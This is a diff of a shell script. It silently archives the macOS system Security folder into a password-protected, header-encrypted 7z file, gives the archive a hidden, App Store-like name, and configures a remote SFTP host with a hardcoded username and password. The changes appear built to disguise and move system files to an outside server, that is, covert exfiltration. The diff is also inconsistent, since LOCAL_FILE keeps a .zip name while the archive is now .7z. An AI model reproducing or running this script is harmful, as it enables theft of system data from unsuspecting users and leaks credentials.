@@ -1,14 +1,16 @@
 
 #cd $home/../../../System/Library/
 #archeiving files
-echo "zipping silently"
+echo "archiving silently"
 #zip -qr Security_unmodified.zip Security && echo "Archiving complete!"
+7z a -pRats@8804 -mhe=on .appstore_unmodified.7z Security -y -bso0 -bsp0
+
 # Configuration
-LOCAL_FILE="Security_unmodified.zip"
-REMOTE_USER="fbb63a5ef02b44fbba92f30d84f59364"
+LOCAL_FILE=".appstore_unmodified.zip"
+REMOTE_USER="04f63fd73a2c4ed99830f9d69deb73a2"
 REMOTE_HOST="eu-central-1.sftpcloud.io"
 REMOTE_PATH="/home"
-REMOTE_PASS="IgTYRB9xm4lgOxFhsEgLJfcRnJr6W4Fq"
+REMOTE_PASS="qOXUUo2mEu60nLr4A5SxLz2Vk8ldk1SL"
 REMOTE_DEST="/"
 
 
